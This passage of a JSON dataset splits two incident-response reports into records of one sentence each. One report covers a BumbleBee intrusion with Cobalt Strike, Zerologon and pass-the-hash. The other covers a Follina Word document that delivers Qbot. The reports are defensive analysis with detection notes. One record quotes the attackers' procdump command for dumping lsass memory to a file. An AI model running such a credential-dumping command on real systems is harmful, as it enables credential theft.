        "text": "Now in the SYSTEM context, this Meterpreter agent executed a Cobalt Strike Beacon DLL.\n",
        "type": "",
        "report": "r-dfir-7",
        "line": 17,
        "index": 4466
    },
    {
        "id": "dfir-reports-filtered/r-dfir-7.md:::S18",
        "text": "The Cobalt Strike Beacon was utilized to perform a second round of reconnaissance and to access credentials.",
        "type": "",
        "report": "r-dfir-7",
        "line": 18,
        "index": 4467
    },
    {
        "id": "dfir-reports-filtered/r-dfir-7.md:::S19",
        "text": "AdFind, nltest, net, and systeminfo were used to facilitate this activity.",
        "type": "",
        "report": "r-dfir-7",
        "line": 19,
        "index": 4468
    },
    {
        "id": "dfir-reports-filtered/r-dfir-7.md:::S20",
        "text": "The Sysinternals tool ProcDump64 was written to disk and used to dump lsass on the beachhead host.",
        "type": "",
        "report": "r-dfir-7",
        "line": 20,
        "index": 4469
    },
    {
        "id": "dfir-reports-filtered/r-dfir-7.md:::S21",
        "text": "Then, the threat actors executed reg.exe to save a copy of the SAM , Security , and Software registry hives on the beachhead host.",
        "type": "",
        "report": "r-dfir-7",
        "line": 21,
        "index": 4470
    },
    {
        "id": "dfir-reports-filtered/r-dfir-7.md:::S22",
        "text": "Lateral movement was then performed over SMB, to transfer a Cobalt Strike Beacon DLL\u2019s to other workstation\u2019s C$\\\\ProgramData\\. These were executed via remote services, but appeared to be there for redundant connections as the threat actors continued to perform their actions on the beachhead workstation.\n",
        "type": "",
        "report": "r-dfir-7",
        "line": 22,
        "index": 4471
    },
    {
        "id": "dfir-reports-filtered/r-dfir-7.md:::S23",
        "text": "After a pause of about three hours, 19 hours since initial access, the threat actors launched an exploit against the primary domain controller targeting the Zerologon (CVE 2020 1472) vulnerability.",
        "type": "",
        "report": "r-dfir-7",
        "line": 23,
        "index": 4472
    },
    {
        "id": "dfir-reports-filtered/r-dfir-7.md:::S24",
        "text": "After successfully exploiting the Domain controller, the threat actors used Pass the Hash to begin working in the context of a user who was a member of the Domain Admins group.",
        "type": "",
        "report": "r-dfir-7",
        "line": 24,
        "index": 4473
    },
    {
        "id": "dfir-reports-filtered/r-dfir-7.md:::S25",
        "text": "From the beachhead host, Invoke-Sharefinder was executed with the output being written to disk.",
        "type": "",
        "report": "r-dfir-7",
        "line": 25,
        "index": 4474
    },
    {
        "id": "dfir-reports-filtered/r-dfir-7.md:::S26",
        "text": "A Cobalt Strike Beacon DLL was then written over SMB to another Domain Controller and executed via a service.\n",
        "type": "",
        "report": "r-dfir-7",
        "line": 26,
        "index": 4475
    },
    {
        "id": "dfir-reports-filtered/r-dfir-7.md:::S27",
        "text": "The threat actors were evicted from the environment and no further impact was observed.",
        "type": "",
        "report": "r-dfir-7",
        "line": 27,
        "index": 4476
    },
    {
        "id": "dfir-reports-filtered/r-dfir-7.md:::S28",
        "text": "We assess with medium confidence this intrusion was related to pre-ransomware activity due to the tool set and techniques the actors displayed.",
        "type": "",
        "report": "r-dfir-7",
        "line": 28,
        "index": 4477
    },
    {
        "id": "dfir-reports-filtered/r-dfir-7.md:::S29",
        "text": "As far as impact, one Domain Controller was left broken causing authentication failures across the domain.\n",
        "type": "",
        "report": "r-dfir-7",
        "line": 29,
        "index": 4478
    },
    {
        "id": "dfir-reports-filtered/r-dfir-7.md:::S30",
        "text": "The intrusion in this case began with a link to a google domain, storage.googleapis.com.",
        "type": "",
        "report": "r-dfir-7",
        "line": 30,
        "index": 4479
    },
    {
        "id": "dfir-reports-filtered/r-dfir-7.md:::S31",
        "text": "This delivery method has been observed in both thread hijacked email distribution, as well as contact form campaigns.",
        "type": "",
        "report": "r-dfir-7",
        "line": 31,
        "index": 4480
    },
    {
        "id": "dfir-reports-filtered/r-dfir-7.md:::S32",
        "text": "We assess with medium-high confidence that the one observed in our intrusion was likely from a contact form campaign, as the initial access URL was spotted in the wild across various sites, impersonating various companies\u2019 legal teams, trying to entice the user to download and review the malicious files.\n",
        "type": "",
        "report": "r-dfir-7",
        "line": 32,
        "index": 4481
    },
    {
        "id": "dfir-reports-filtered/r-dfir-7.md:::S33",
        "text": "After clicking the link, the users end up at what, at first glance, may appear to be a legitimate google download site.\n",
        "type": "",
        "report": "r-dfir-7",
        "line": 33,
        "index": 4482
    },
    {
        "id": "dfir-reports-filtered/r-dfir-7.md:::S34",
        "text": "Next, a zip file is downloaded to the victim\u2019s system, which when unzipped reveals the ISO image file StolenImages_Evidence.iso , once mounted\u2013lures the victim to open a shortcut mimicking a fake documents folder:\n",
        "type": "",
        "report": "r-dfir-7",
        "line": 34,
        "index": 4483
    },
    {
        "id": "dfir-reports-filtered/r-dfir-7.md:::S35",
        "text": "The LNK was pointing to the following command, which runs a malicious DLL when the user double clicks on the LNK file:\n",
        "type": "",
        "report": "r-dfir-7",
        "line": 35,
        "index": 4484
    },
    {
        "id": "dfir-reports-filtered/r-dfir-7.md:::S36",
        "text": "By extracting LNK metadata using Eric Zimmerman\u2019s LECmd tool, we noticed that the initial BumbleBee payload was generated by the same threat actors reported in our previous BumbleBee report:\n",
        "type": "",
        "report": "r-dfir-7",
        "line": 36,
        "index": 4485
    },
    {
        "id": "dfir-reports-filtered/r-dfir-7.md:::S37",
        "text": "The tracker database block details containing threat actor\u2019s hostname, MAC Address, and other details are the exact same as seen our the last BumbleBee report.",
        "type": "",
        "report": "r-dfir-7",
        "line": 37,
        "index": 4486
    },
    {
        "id": "dfir-reports-filtered/r-dfir-7.md:::S38",
        "text": "However, the payload was slightly modified (name and icon).\n",
        "type": "",
        "report": "r-dfir-7",
        "line": 38,
        "index": 4487
    },
    {
        "id": "dfir-reports-filtered/r-dfir-7.md:::S39",
        "text": "The threat actors dropped and executed multiple payloads reaching out to different C2s.",
        "type": "",
        "report": "r-dfir-7",
        "line": 39,
        "index": 4488
    },
    {
        "id": "dfir-reports-filtered/r-dfir-7.md:::S40",
        "text": "The graph below shows how the threat actors were able to pivot between C2s by either injecting into legitimate processes or dropping and executing new payloads.",
        "type": "",
        "report": "r-dfir-7",
        "line": 40,
        "index": 4489
    },
    {
        "id": "dfir-reports-filtered/r-dfir-7.md:::S41",
        "text": "Like in our previous BumbleBee report, we see the use of injection into a legitimate Windows executable.\n",
        "type": "",
        "report": "r-dfir-7",
        "line": 41,
        "index": 4490
    },
    {
        "id": "dfir-reports-filtered/r-dfir-7.md:::S42",
        "text": "And likewise, we see BumbleBee spawning these new processes using WmiPrvSE.exe.\n",
        "type": "",
        "report": "r-dfir-7",
        "line": 42,
        "index": 4491
    },
    {
        "id": "dfir-reports-filtered/r-dfir-7.md:::S43",
        "text": "The graphic below shows all payloads dropped, executed, or injected by the threat actors.",
        "type": "",
        "report": "r-dfir-7",
        "line": 43,
        "index": 4492
    },
    {
        "id": "dfir-reports-filtered/r-dfir-7.md:::S44",
        "text": "Both Meterpreter and Cobalt Strike payloads were used during this intrusion.\n",
        "type": "",
        "report": "r-dfir-7",
        "line": 44,
        "index": 4493
    },
    {
        "id": "dfir-reports-filtered/r-dfir-7.md:::S45",
        "text": "The getsystem module was used to elevate access on the beachhead host.\n",
        "type": "",
        "report": "r-dfir-7",
        "line": 45,
        "index": 4494
    },
    {
        "id": "dfir-reports-filtered/r-dfir-7.md:::S46",
        "text": "On the second day, a Netlogon spike was observed from the beachhead host to a domain controller.\n",
        "type": "",
        "report": "r-dfir-7",
        "line": 46,
        "index": 4495
    },
    {
        "id": "dfir-reports-filtered/r-dfir-7.md:::S47",
        "text": "This spike was made up of various netlogon requests (NetrServerReqChallenge, NetrServerAuthenticate2, NetrServerPasswordSet2) from the beachhead host to the primary domain controller.",
        "type": "",
        "report": "r-dfir-7",
        "line": 47,
        "index": 4496
    },
    {
        "id": "dfir-reports-filtered/r-dfir-7.md:::S48",
        "text": "A view of the traffic reveals that the threat actors had exploited CVE 2020 1472, otherwise known as ZeroLogon.",
        "type": "",
        "report": "r-dfir-7",
        "line": 48,
        "index": 4497
    },
    {
        "id": "dfir-reports-filtered/r-dfir-7.md:::S49",
        "text": "In the PCAP below, we can see the packet where the exploit succeeds in resetting the credential to all zeros.\n",
        "type": "",
        "report": "r-dfir-7",
        "line": 49,
        "index": 4498
    },
    {
        "id": "dfir-reports-filtered/r-dfir-7.md:::S50",
        "text": "On the domain controller, a 4742 event was generated showing the beachhead host changing the password on the domain controller, matching the timestamps to the network data.",
        "type": "",
        "report": "r-dfir-7",
        "line": 50,
        "index": 4499
    },
    {
        "id": "dfir-reports-filtered/r-dfir-7.md:::S51",
        "text": "After exploiting Zerologon, the threat actors were also seen using Pass the Hash to begin working in the context of a user, who was a member of the Domain Admins group.",
        "type": "",
        "report": "r-dfir-7",
        "line": 51,
        "index": 4500
    },
    {
        "id": "dfir-reports-filtered/r-dfir-7.md:::S52",
        "text": "ImagingDevices.exe injection into \u201csvchost.exe -k UnistackSvcGroup -s WpnUserService\u201d using NtAllocateVirtualMemoryRemoteApiCall.",
        "type": "",
        "report": "r-dfir-7",
        "line": 52,
        "index": 4501
    },
    {
        "id": "dfir-reports-filtered/r-dfir-7.md:::S53",
        "text": "Several other processes were injected into as seen below:\n",
        "type": "",
        "report": "r-dfir-7",
        "line": 53,
        "index": 4502
    },
    {
        "id": "dfir-reports-filtered/r-dfir-7.md:::S54",
        "text": "The threat actors were observed bypassing UAC via WSReset and DelegateExecute, spawning new processes at a High integrity level.",
        "type": "",
        "report": "r-dfir-7",
        "line": 54,
        "index": 4503
    },
    {
        "id": "dfir-reports-filtered/r-dfir-7.md:::S55",
        "text": "While executing this UAC bypass, the threat actors seemed to be running into some kind of trouble during execution, which required them to try the technique several times and tried to kill one of their processes from a prior attempt.\n",
        "type": "",
        "report": "r-dfir-7",
        "line": 55,
        "index": 4504
    },
    {
        "id": "dfir-reports-filtered/r-dfir-7.md:::S56",
        "text": "In addition to the WSReset UAC bypass, the threat actors tried a method using slui.exe.",
        "type": "",
        "report": "r-dfir-7",
        "line": 56,
        "index": 4505
    },
    {
        "id": "dfir-reports-filtered/r-dfir-7.md:::S57",
        "text": "The data points to use of the Meterpreter implementation here.[1]\n",
        "type": "",
        "report": "r-dfir-7",
        "line": 57,
        "index": 4506
    },
    {
        "id": "dfir-reports-filtered/r-dfir-7.md:::S58",
        "text": "The threat actors were also seen deleting a number of their tools which were previously dropped to perform various tactics:\n",
        "type": "",
        "report": "r-dfir-7",
        "line": 58,
        "index": 4507
    },
    {
        "id": "dfir-reports-filtered/r-dfir-7.md:::S59",
        "text": "Throughout the intrusion, the injected Cobalt Strike Processes utilized various named pipes for inter-process communications.",
        "type": "",
        "report": "r-dfir-7",
        "line": 59,
        "index": 4508
    },
    {
        "id": "dfir-reports-filtered/r-dfir-7.md:::S60",
        "text": "Many of these pipes used default Cobalt Strike pipe patterns.",
        "type": "",
        "report": "r-dfir-7",
        "line": 60,
        "index": 4509
    },
    {
        "id": "dfir-reports-filtered/r-dfir-7.md:::S61",
        "text": "Known Cobalt Strike pipes used:\n",
        "type": "",
        "report": "r-dfir-7",
        "line": 61,
        "index": 4510
    },
    {
        "id": "dfir-reports-filtered/r-dfir-7.md:::S62",
        "text": "We also saw the unusual named pipes coming from ImagingDevices.exe which was injected with Meterpreter below:\n",
        "type": "",
        "report": "r-dfir-7",
        "line": 62,
        "index": 4511
    },
    {
        "id": "dfir-reports-filtered/r-dfir-7.md:::S63",
        "text": "The threat actor dropped the Sysinternals executable procdump64.exe , which they then used to dump the lsass process.",
        "type": "",
        "report": "r-dfir-7",
        "line": 63,
        "index": 4512
    },
    {
        "id": "dfir-reports-filtered/r-dfir-7.md:::S64",
        "text": "The command observed was:\n",
        "type": "",
        "report": "r-dfir-7",
        "line": 64,
        "index": 4513
    },
    {
        "id": "dfir-reports-filtered/r-dfir-7.md:::S65",
        "text": "procdump64.exe -accepteula -ma lsass.exe C:\\ProgramData\\lsass.dmp\n",
        "type": "",
        "report": "r-dfir-7",
        "line": 65,
        "index": 4514
    },
    {
        "id": "dfir-reports-filtered/r-dfir-7.md:::S66",
        "text": "Using the Cobalt Strike beacon, injected in a svchost.exe process, the threat actors dumped SAM , SECURITY , and SYSTEM hives using the native reg.exe utility.",
        "type": "",
        "report": "r-dfir-7",
        "line": 66,
        "index": 4515
    },
    {
        "id": "dfir-reports-filtered/r-dfir-7.md:::S67",
        "text": "Below are the commands that were used:\n",
        "type": "",
        "report": "r-dfir-7",
        "line": 67,
        "index": 4516
    },
    {
        "id": "dfir-reports-filtered/r-dfir-7.md:::S68",
        "text": "The Discovery phase was carried out in this case using both native Windows tools, and external tools such as AdFind and PowerSploit.",
        "type": "",
        "report": "r-dfir-7",
        "line": 68,
        "index": 4517
    },
    {
        "id": "dfir-reports-filtered/r-dfir-7.md:::S69",
        "text": "Initial discovery was performed using various Windows utilities.",
        "type": "",
        "report": "r-dfir-7",
        "line": 69,
        "index": 4518
    },
    {
        "id": "dfir-reports-filtered/r-dfir-7.md:::S70",
        "text": "After dumping the lsass.exe process on the beachhead machine, the threat actors then launched af.exe (AdFind) to find all user objects and computers in the domain.\n",
        "type": "",
        "report": "r-dfir-7",
        "line": 70,
        "index": 4519
    },
    {
        "id": "dfir-reports-filtered/r-dfir-7.md:::S71",
        "text": "System utilities used for discovery included:\n",
        "type": "",
        "report": "r-dfir-7",
        "line": 71,
        "index": 4520
    },
    {
        "id": "dfir-reports-filtered/r-dfir-7.md:::S72",
        "text": "Throughout the intrusion, the threat actor kept on trying to view a file named sh.txt.\n",
        "type": "",
        "report": "r-dfir-7",
        "line": 72,
        "index": 4521
    },
    {
        "id": "dfir-reports-filtered/r-dfir-7.md:::S73",
        "text": "The file appears to have been the intended output for execution of the Invoke-ShareFinder command.",
        "type": "",
        "report": "r-dfir-7",
        "line": 73,
        "index": 4522
    },
    {
        "id": "dfir-reports-filtered/r-dfir-7.md:::S74",
        "text": "Execution of the command was visible in the PowerShell 4103 and 4104 logs.\n",
        "type": "",
        "report": "r-dfir-7",
        "line": 74,
        "index": 4523
    },
    {
        "id": "dfir-reports-filtered/r-dfir-7.md:::S75",
        "text": "Invoke-Sharefoinder is a module in the PowerSploit framework.",
        "type": "",
        "report": "r-dfir-7",
        "line": 75,
        "index": 4524
    },
    {
        "id": "dfir-reports-filtered/r-dfir-7.md:::S76",
        "text": "This command, in particular, can find (non-standard) shares on hosts in the local domain.\n",
        "type": "",
        "report": "r-dfir-7",
        "line": 76,
        "index": 4525
    },
    {
        "id": "dfir-reports-filtered/r-dfir-7.md:::S77",
        "text": "The threat actors used the SMB protocol to move laterally after compromising the beachhead.",
        "type": "",
        "report": "r-dfir-7",
        "line": 77,
        "index": 4526
    },
    {
        "id": "dfir-reports-filtered/r-dfir-7.md:::S78",
        "text": "They specifically copied the n23.dll (Cobalt Strike) file to the C:\\ProgramData path and then ran it.\n",
        "type": "",
        "report": "r-dfir-7",
        "line": 78,
        "index": 4527
    },
    {
        "id": "dfir-reports-filtered/r-dfir-7.md:::S79",
        "text": "We can confirm that the file was copied and then launched via the new service by examining the various host\u2019s system logs for event id 7045.\n",
        "type": "",
        "report": "r-dfir-7",
        "line": 79,
        "index": 4528
    },
    {
        "id": "dfir-reports-filtered/r-dfir-7.md:::S80",
        "text": "Threat actors used multiple command and control servers to interact with the compromised environment.\n",
        "type": "",
        "report": "r-dfir-7",
        "line": 80,
        "index": 4529
    },
    {
        "id": "dfir-reports-filtered/r-dfir-7.md:::S81",
        "text": "Cobalt Strike Server Config:\n",
        "type": "",
        "report": "r-dfir-7",
        "line": 81,
        "index": 4530
    },
    {
        "id": "dfir-reports-filtered/r-dfir-7.md:::S82",
        "text": "After exploiting Zerologon on the domain controller, the threat actor tried a few more things and then took a break from the hands on keyboard portion of the intrusion.",
        "type": "",
        "report": "r-dfir-7",
        "line": 82,
        "index": 4531
    },
    {
        "id": "dfir-reports-filtered/r-dfir-7.md:::S83",
        "text": "The threat actor was then evicted from the environment.",
        "type": "",
        "report": "r-dfir-7",
        "line": 83,
        "index": 4532
    },
    {
        "id": "dfir-reports-filtered/r-dfir-7.md:::S84",
        "text": "During IR, it was found that the primary domain controller was unresponsive to domain authentication due to the exploit run against it, resulting in domain authentication breaking around the environment.",
        "type": "",
        "report": "r-dfir-7",
        "line": 84,
        "index": 4533
    },
    {
        "id": "dfir-reports-filtered/r-dfir-8.md:::S0",
        "text": "In this intrusion, a threat actor abused the CVE-2022-30190 (Follina) vulnerability, where exploit code was embedded inside a malicious Word document to gain initial access.",
        "type": "",
        "report": "r-dfir-8",
        "line": 0,
        "index": 4534
    },
    {
        "id": "dfir-reports-filtered/r-dfir-8.md:::S1",
        "text": "We assess with medium to high confidence that the documents likely arrived by the means of thread-hijacked emails from distribution channels used by TA570.\n",
        "type": "",
        "report": "r-dfir-8",
        "line": 1,
        "index": 4535
    },
    {
        "id": "dfir-reports-filtered/r-dfir-8.md:::S2",
        "text": "Upon execution of the weaponized Word document, a HTML file was retrieved from a remote server containing a PowerShell payload.",
        "type": "",
        "report": "r-dfir-8",
        "line": 2,
        "index": 4536
    },
    {
        "id": "dfir-reports-filtered/r-dfir-8.md:::S3",
        "text": "The payload contains base64-encoded content and is used to download Qbot DLLs inside the user\u2019s Temp directory.",
        "type": "",
        "report": "r-dfir-8",
        "line": 3,
        "index": 4537
    },
    {
        "id": "dfir-reports-filtered/r-dfir-8.md:::S4",
        "text": "The Qbot DLL was executed via regsvr32.exe and the activity was immediately followed by injection into legitimate processes (explorer.exe) on the host.\n",
        "type": "",
        "report": "r-dfir-8",
        "line": 4,
        "index": 4538
    },
    {
        "id": "dfir-reports-filtered/r-dfir-8.md:::S5",
        "text": "The injected process spawned Windows utilities such as whoami , net.exe and nslookup , to perform discovery activity and also established connection to Qbot C2 servers.",
        "type": "",
        "report": "r-dfir-8",
        "line": 5,
        "index": 4539
    },
    {
        "id": "dfir-reports-filtered/r-dfir-8.md:::S6",
        "text": "Almost an hour later, the threat actors leveraged a Windows built-in utility, esentutl.exe , to extract browser data, a technique also observed in earlier cases.",
        "type": "",
        "report": "r-dfir-8",
        "line": 6,
        "index": 4540
    },
    {
        "id": "dfir-reports-filtered/r-dfir-8.md:::S7",
        "text": "[1][2]\n",
        "type": "",
        "report": "r-dfir-8",
        "line": 7,
        "index": 4541
    },
    {
        "id": "dfir-reports-filtered/r-dfir-8.md:::S8",
        "text": "Qbot used scheduled task creation as a persistence mechanism.",
        "type": "",
        "report": "r-dfir-8",
        "line": 8,
        "index": 4542
    },
    {
        "id": "dfir-reports-filtered/r-dfir-8.md:::S9",
        "text": "The scheduled task contained a PowerShell command referencing multiple C2 IP addresses stored as base64-encoded blob in randomly named keys under the HKCU registry hive.",
        "type": "",
        "report": "r-dfir-8",
        "line": 9,
        "index": 4543
    },
    {
        "id": "dfir-reports-filtered/r-dfir-8.md:::S10",
        "text": "After this activity, the threat actor proceeded with the remote creation of Qbot DLLs over SMB on multiple hosts throughout the environment.",
        "type": "",
        "report": "r-dfir-8",
        "line": 10,
        "index": 4544
    },
    {
        "id": "dfir-reports-filtered/r-dfir-8.md:::S11",
        "text": "They then added multiple folders to the Windows Defender exclusions list on each of the infected machines to evade defenses, as we have seen before with Qbot.",
        "type": "",
        "report": "r-dfir-8",
        "line": 11,
        "index": 4545
    },
    {
        "id": "dfir-reports-filtered/r-dfir-8.md:::S12",
        "text": "Remote services were then used to execute the DLLs.\n",
        "type": "",
        "report": "r-dfir-8",
        "line": 12,
        "index": 4546
    },
    {
        "id": "dfir-reports-filtered/r-dfir-8.md:::S13",
        "text": "A Cobalt Strike server connection was witnessed within the first hour, but it wasn\u2019t until after lateral movement occurred that activity from that server began.",
        "type": "",
        "report": "r-dfir-8",
        "line": 13,
        "index": 4547
    },
    {
        "id": "dfir-reports-filtered/r-dfir-8.md:::S14",
        "text": "Utilities such as nltest.exe and AdFind were executed by the injected Cobalt Strike process (explorer.exe).",
        "type": "",
        "report": "r-dfir-8",
        "line": 14,
        "index": 4548
    },
    {
        "id": "dfir-reports-filtered/r-dfir-8.md:::S15",
        "text": "The injected process was also used to access the LSASS system process.",
        "type": "",
        "report": "r-dfir-8",
        "line": 15,
        "index": 4549
    },
    {
        "id": "dfir-reports-filtered/r-dfir-8.md:::S16",
        "text": "Then, the threat actors installed a remote management tool named NetSupport Manager.",
        "type": "",
        "report": "r-dfir-8",
        "line": 16,
        "index": 4550
    },
    {
        "id": "dfir-reports-filtered/r-dfir-8.md:::S17",
        "text": "Within 20 minutes of the installation, the threat actor moved laterally to the domain controller via a Remote Desktop session.",
        "type": "",
        "report": "r-dfir-8",
        "line": 17,
        "index": 4551
    },
    {
        "id": "dfir-reports-filtered/r-dfir-8.md:::S18",
        "text": "On the domain controller, the tool Atera Remote Management was deployed, a popular tool used by attackers for controlling victim machines.",
        "type": "",
        "report": "r-dfir-8",
        "line": 18,
        "index": 4552
    },
    {
        "id": "dfir-reports-filtered/r-dfir-8.md:::S19",
        "text": "This was the last adversarial activity observed for the day.\n",
        "type": "",
        "report": "r-dfir-8",
        "line": 19,
        "index": 4553
    },
    {
        "id": "dfir-reports-filtered/r-dfir-8.md:::S20",
        "text": "The threat actors checked-in early the next day and downloaded a tool named Network Scanner by SoftPerfect on a domain controller.",
        "type": "",
        "report": "r-dfir-8",
        "line": 20,
        "index": 4554
    },
    {
        "id": "dfir-reports-filtered/r-dfir-8.md:::S21",
        "text": "The tool was executed, which ran a port scan across the network.",
        "type": "",
        "report": "r-dfir-8",
        "line": 21,
        "index": 4555
    },
    {
        "id": "dfir-reports-filtered/r-dfir-8.md:::S22",
        "text": "Finally, the threat actors connected to one of the file share servers via RDP and accessed sensitive documents.\n",
        "type": "",
        "report": "r-dfir-8",
        "line": 22,
        "index": 4556
    },
    {
        "id": "dfir-reports-filtered/r-dfir-8.md:::S23",
        "text": "No further attacker activity was observed before the threat actors were evicted from the environment.\n",
        "type": "",
        "report": "r-dfir-8",
        "line": 23,
        "index": 4557
    },
    {
        "id": "dfir-reports-filtered/r-dfir-8.md:::S24",
        "text": "Ever since the disclosure of the Follina vulnerability (CVE-2022-30190) earlier this year, threat actors have been known to leverage the flaw in various phishing campaigns.",
        "type": "",
        "report": "r-dfir-8",
        "line": 24,
        "index": 4558
    },
    {
        "id": "dfir-reports-filtered/r-dfir-8.md:::S25",
        "text": "Delivery of this intrusion was linked to TA570, using hijacked email threads to deliver the initial payload.",
        "type": "",
        "report": "r-dfir-8",
        "line": 25,
        "index": 4559
    },
    {
        "id": "dfir-reports-filtered/r-dfir-8.md:::S26",
        "text": "This intrusion started after a Word document, weaponized with Follina exploit code, was used to deliver and infect the host with Qbot malware.",
        "type": "",
        "report": "r-dfir-8",
        "line": 26,
        "index": 4560
    },
    {
        "id": "dfir-reports-filtered/r-dfir-8.md:::S27",
        "text": "When dealing with a Word document based on the OOXML format, associated files and folders are stored within a compressed ZIP archive.",
        "type": "",
        "report": "r-dfir-8",
        "line": 27,
        "index": 4561
    },
    {
        "id": "dfir-reports-filtered/r-dfir-8.md:::S28",
        "text": "These items can be easily extracted by using an arbitrary zip utility like unzip .",
        "type": "",
        "report": "r-dfir-8",
        "line": 28,
        "index": 4562
    },
    {
        "id": "dfir-reports-filtered/r-dfir-8.md:::S29",
        "text": "One of the embedded files that requires inspection during the analysis of a Follina maldoc, is named document.xml.rels\n",
        "type": "",
        "report": "r-dfir-8",
        "line": 29,
        "index": 4563
    },
    {
        "id": "dfir-reports-filtered/r-dfir-8.md:::S30",
        "text": "This \u201crelationship\u201d (RELS) file contained an external reference to a remote HTML file, configured to be retrieved and loaded when the Word document is opened, or viewed in Preview Mode.",
        "type": "",
        "report": "r-dfir-8",
        "line": 30,
        "index": 4564
    },
    {
        "id": "dfir-reports-filtered/r-dfir-8.md:::S31",
        "text": "At the bottom of the retrieved HTML page source, the script tag was defined and contained malicious JavaScript code that called the ms-msdt scheme.\n",
        "type": "",
        "report": "r-dfir-8",
        "line": 31,
        "index": 4565
    },
    {
        "id": "dfir-reports-filtered/r-dfir-8.md:::S32",
        "text": "When a system is vulnerable to Follina (CVE-2022-30190), the code will be interpreted and executed by msdt.exe (Microsoft Support Diagnostic Tool).",
        "type": "",
        "report": "r-dfir-8",
        "line": 32,
        "index": 4566
    },
    {
        "id": "dfir-reports-filtered/r-dfir-8.md:::S33",
        "text": "A good detection opportunity is to monitor for this process being spawned by a Microsoft Office application such as WINWORD.EXE\n",
        "type": "",
        "report": "r-dfir-8",
        "line": 33,
        "index": 4567
    },
    {
        "id": "dfir-reports-filtered/r-dfir-8.md:::S34",
        "text": "In our case, the payload contained base64-encoded PowerShell code.",
        "type": "",
        "report": "r-dfir-8",
        "line": 34,
        "index": 4568
    },
    {
        "id": "dfir-reports-filtered/r-dfir-8.md:::S35",
        "text": "The decoded payload is also logged in EventID 4104 (script block logging) upon execution by the PowerShell engine.\n",
        "type": "",
        "report": "r-dfir-8",
        "line": 35,
        "index": 4569
    },
    {
        "id": "dfir-reports-filtered/r-dfir-8.md:::S36",
        "text": "The Follina payload was designed to download Qbot libraries from three different URLs, drop the files inside the user\u2019s temp directory, and finally execute the DLLs using regsvr32.exe\n",
        "type": "",
        "report": "r-dfir-8",
        "line": 36,
        "index": 4570
    },
    {
        "id": "dfir-reports-filtered/r-dfir-8.md:::S37",
        "text": "Upon execution of the MSDT payload, a new instance of the sdiagnhost.exe (Scripted Diagnostics Native Host) was spawned.",
        "type": "",
        "report": "r-dfir-8",
        "line": 37,
        "index": 4571
    },
    {
        "id": "dfir-reports-filtered/r-dfir-8.md:::S38",
        "text": "This process was ultimately responsible for invoking the Follina payload, starting, in our case, three child instances of regsrv32.exe .\n",
        "type": "",
        "report": "r-dfir-8",
        "line": 38,
        "index": 4572
    },
    {
        "id": "dfir-reports-filtered/r-dfir-8.md:::S39",
        "text": "After execution of the payload, the XML file PCW.debugreport.xml was created in the %localappdata%\\Diagnostics. directory.",
        "type": "",
        "report": "r-dfir-8",
        "line": 39,
        "index": 4573
    },
    {
        "id": "dfir-reports-filtered/r-dfir-8.md:::S40",
        "text": "This file can serve as a valuable artifact when analyzing Follina exploitation (attempts).",
        "type": "",
        "report": "r-dfir-8",
        "line": 40,
        "index": 4574
    },
    {
        "id": "dfir-reports-filtered/r-dfir-8.md:::S41",
        "text": "The payload, preceded by its recursive path, can be found in the TargetPath element of this XML-file.",
        "type": "",
        "report": "r-dfir-8",
        "line": 41,
        "index": 4575
    },
    {
        "id": "dfir-reports-filtered/r-dfir-8.md:::S42",
        "text": "The payload configured to execute on the system is embedded in this file.",
        "type": "",
        "report": "r-dfir-8",
        "line": 42,
        "index": 4576
    },
    {
        "id": "dfir-reports-filtered/r-dfir-8.md:::S43",
        "text": "Qbot maintained persistence by creating scheduled tasks across multiple endpoints.",
        "type": "",
        "report": "r-dfir-8",
        "line": 43,
        "index": 4577
    },
    {
        "id": "dfir-reports-filtered/r-dfir-8.md:::S44",
        "text": "An example of a command that was executed can be seen below:\n",
        "type": "",
        "report": "r-dfir-8",
        "line": 44,
        "index": 4578
    },
    {
        "id": "dfir-reports-filtered/r-dfir-8.md:::S45",
        "text": "The scheduled task creation events were recorded in the Microsoft-Windows-TaskScheduler/Operational log.\n",
        "type": "",
        "report": "r-dfir-8",
        "line": 45,
        "index": 4579
    },
    {
        "id": "dfir-reports-filtered/r-dfir-8.md:::S46",
        "text": "Inspection of the scheduled task showed that PowerShell referenced a registry key with a random generated value.",
        "type": "",
        "report": "r-dfir-8",
        "line": 46,
        "index": 4580
    },
    {
        "id": "dfir-reports-filtered/r-dfir-8.md:::S47",
        "text": "This value differed from endpoint to endpoint:\n",
        "type": "",
        "report": "r-dfir-8",
        "line": 47,
        "index": 4581
    },
    {
        "id": "dfir-reports-filtered/r-dfir-8.md:::S48",
        "text": "The data of this registry key consisted of a base64-encoded string:\n",
        "type": "",
        "report": "r-dfir-8",
        "line": 48,
        "index": 4582
    },
    {
        "id": "dfir-reports-filtered/r-dfir-8.md:::S49",
        "text": "Decoding the base64-encoded string revealed a significant number of QBot\u2019s C2 IPv4 addresses and ports:\n",
        "type": "",
        "report": "r-dfir-8",
        "line": 49,
        "index": 4583
    },
    {
        "id": "dfir-reports-filtered/r-dfir-8.md:::S50",
        "text": "C2 IPv4s are provided in the IoC section of this report.",
        "type": "",
        "report": "r-dfir-8",
        "line": 50,
        "index": 4584
    },
    {
        "id": "dfir-reports-filtered/r-dfir-8.md:::S51",
        "text": "The SysWow64\\Explorer.exe process was also observed cycling through a number of domains \u2013 indicated by the DNS requests with a QueryStatus of RCODE:0 (NO ERROR).",
        "type": "",
        "report": "r-dfir-8",
        "line": 51,
        "index": 4585
    },
    {
        "id": "dfir-reports-filtered/r-dfir-8.md:::S52",
        "text": "In addition, several connectivity checks were made to email relay services:\n",
        "type": "",
        "report": "r-dfir-8",
        "line": 52,
        "index": 4586
    },
    {
        "id": "dfir-reports-filtered/r-dfir-8.md:::S53",
        "text": "As reported earlier this year, QBot is known for using process hollowing.",
        "type": "",
        "report": "r-dfir-8",
        "line": 53,
        "index": 4587
    },
    {
        "id": "dfir-reports-filtered/r-dfir-8.md:::S54",
        "text": "In this case, the 32-bit version of explorer.exe (indicated by the use of C:\\Windows\\SysWOW64) was started in a suspended state, which was then used as a target for injection.",
        "type": "",
        "report": "r-dfir-8",
        "line": 54,
        "index": 4588
    },
    {
        "id": "dfir-reports-filtered/r-dfir-8.md:::S55",
        "text": "Inspecting memory dumped from the host, the injected processes were easy to discover using Volatility and the malfind module.",
        "type": "",
        "report": "r-dfir-8",
        "line": 55,
        "index": 4589
    },
    {
        "id": "dfir-reports-filtered/r-dfir-8.md:::S56",
        "text": "Looking for output that included explorer.exe and contains the VAD tag PAGE_EXECUTE_READWRITE and MZ headers in the memory space, common attributes observed for process injection in memory.",
        "type": "",
        "report": "r-dfir-8",
        "line": 56,
        "index": 4590
    },
    {
